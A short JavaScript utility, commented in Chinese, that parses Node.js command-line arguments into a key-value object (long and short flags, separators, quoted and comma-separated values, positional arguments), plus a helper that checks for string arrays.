// shell 会将命令行参数按空格分割
/**
 * Parse command line arguments
 * @returns {object} Key-value arguments
 */
function parseArgs() {
    const args = {};
    const argv = process.argv.slice(2);
    let i = 0;

    while (i < argv.length) {
        const arg = argv[i];

        // 处理 --key 或 --key=value 或 --key:value
        if (arg.startsWith('--')) {
            let key, value;

            // 尝试按 '=' 或 ':' 分割
            const sepIndex = arg.search(/[=:]/);
            if (sepIndex !== -1) {
                key = arg.slice(2, sepIndex);
                value = arg.slice(sepIndex + 1);
                i++;
            } else {
                // 没有分隔符，尝试从下一个参数取值
                key = arg.slice(2);
                if (i + 1 < argv.length && !argv[i + 1].startsWith('-')) {
                    value = argv[i + 1];
                    i += 2;
                } else {
                    // 没有下一个值，视为布尔标记
                    value = '';
                    i++;
                }
            }

            // 去除引号（可选）
            if ((value.startsWith('"') && value.endsWith('"')) ||
                (value.startsWith("'") && value.endsWith("'"))) {
                value = value.slice(1, -1);
            }

            // 处理多值（逗号分隔）
            const parts = value.split(',').filter(v => v.length > 0);
            if (parts.length === 0) {
                args[key] = true;   // 无值 → 布尔 true
            } else if (parts.length === 1) {
                args[key] = parts[0]; // 单值保持字符串
            } else {
                args[key] = parts;    // 多值数组
            }

            console.log(`key: ${key}, value: ${value}, parsed:`, args[key]);
        }
        // 处理 -x 短选项（不带值）
        else if (arg.startsWith('-')) {
            args[arg.slice(1)] = true;
            i++;
        }
        // 位置参数（以 _0, _1 ... 存储）
        else {
            const posKeys = Object.keys(args).filter(k => k.startsWith('_'));
            args['_' + posKeys.length] = arg;
            i++;
        }
    }
    return args;
}

function isStringArray(value) {
    // 1. 必须是数组
    // 2. 数组中的每一个元素都必须是 string 类型
    return Array.isArray(value) && value.every(item => typeof item === 'string');
}

